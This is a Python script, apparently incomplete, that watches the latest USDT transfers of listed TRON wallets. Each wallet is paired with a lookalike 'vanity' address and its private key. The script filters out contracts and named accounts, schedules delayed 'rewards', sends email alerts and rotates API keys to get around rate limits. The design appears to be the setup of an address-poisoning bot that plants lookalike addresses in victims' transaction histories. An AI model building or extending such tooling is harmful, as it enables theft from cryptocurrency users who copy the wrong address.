import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal
import itertools
from datetime import datetime, timedelta

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
TRONGRID_API_KEYS = os.getenv("TRONGRID_API_KEY", "").split(",")
FUNDING_PRIVATE_KEY = os.getenv("FUNDING_PRIVATE_KEY")

# Custom HTTPProvider with API key rotation and rate limiting
class RateLimitedHTTPProvider(HTTPProvider):
    def __init__(self, api_keys, endpoint_uri, timeout=30):
        super().__init__(endpoint_uri=endpoint_uri, timeout=timeout)
        self.api_keys = api_keys
        self.key_cycle = itertools.cycle(api_keys)
        self.last_request_time = {key: 0 for key in api_keys}
        self.request_count = {key: 0 for key in api_keys}
        self.max_requests_per_day = 100_000
        self.rate_limit_seconds = 1

    def make_request(self, method, url, *args, **kwargs):
        for _ in range(len(self.api_keys)):
            api_key = next(self.key_cycle)
            if self.request_count[api_key] < self.max_requests_per_day:
                break
        else:
            raise Exception("All API keys have reached their daily request limit.")

        current_time = time.time()
        elapsed = current_time - self.last_request_time[api_key]
        if elapsed < self.rate_limit_seconds:
            time.sleep(self.rate_limit_seconds - elapsed)

        self.last_request_time[api_key] = time.time()
        self.request_count[api_key] += 1

        headers = kwargs.get("headers", {})
        headers["TRON-PRO-API-KEY"] = api_key
        kwargs["headers"] = headers

        print(f"[RateLimitedHTTPProvider] Using API key {api_key} (Count: {self.request_count[api_key]})")
        return super().make_request(method, url, *args, **kwargs)

# Initialize Tron client with custom provider
client = Tron(RateLimitedHTTPProvider(api_keys=TRONGRID_API_KEYS, endpoint_uri="https://api.trongrid.io"))

# Constants and state
USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
REWARD_DELAY_MINUTES = 30
last_tx_ids = {}
last_reward_times = {}

SKIP_CONTRACT_ADDRESSES = [
    USDT_CONTRACT_ADDRESS,
    "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA",
]

SKIP_WALLET_ADDRESSES = set([
    *WALLET_ADDRESSES,
    *VANITY_ADDRESSES,
    "TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa",
])

# Checks
if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, FUNDING_PRIVATE_KEY]):
    print("Missing email config or funding private key.")
    exit(1)

if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses, or keys.")
    exit(1)

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"[is_contract_address] Error: {e}")
        return False

def has_public_name(address):
    try:
        url = f"https://api.trongrid.io/v1/accounts/{address}"
        response = client.provider.make_request("GET", url, timeout=10)
        if response.status_code != 200:
            return False
        data = response.json().get("data", [])
        return bool(data and data[0].get("name"))
    except Exception as e:
        print(f"[has_public_name] Error for {address}: {e}")
        return False

def get_latest_trc20_transaction(wallet_address):
    try:
        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}/transactions/trc20?limit=1&order_by=block_timestamp,desc"
        response = client.provider.make_request("GET", url, timeout=10)
        if response.status_code == 404:
            print(f"[{wallet_address}] Not found on-chain yet.")
            return None
        if response.status_code != 200:
            print(f"[{wallet_address}] Failed to fetch TRC20 txns. Status: {response.status_code}")
            return None
        txs = response.json().get("data", [])
        if not txs:
            return None
        tx = txs[0]
        if tx.get("token_info", {}).get("address") not in SKIP_CONTRACT_ADDRESSES:
            return None
        return {
            "transaction_id": tx.get("transaction_id"),
            "from": tx.get("from"),
            "to": tx.get("to"),
            "value": tx.get("value"),
        }
    except Exception as e:
        print(f"[get_latest_trc20_transaction] Error: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("[Email] Notification sent.")
    except Exception as e:
        print("[Email] Failed:", e)

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = client.trx.freeze_balance(address, int(freeze_amount * 1_000_000), 3, "BANDWIDTH").build().sign(priv_key)
        result = txn.broadcast().wait()
        print("Bandwidth freeze TX:", result.get("id"))
    except Exception as e:
        print("[freeze_trx_for_bandwidth] Error:", e)
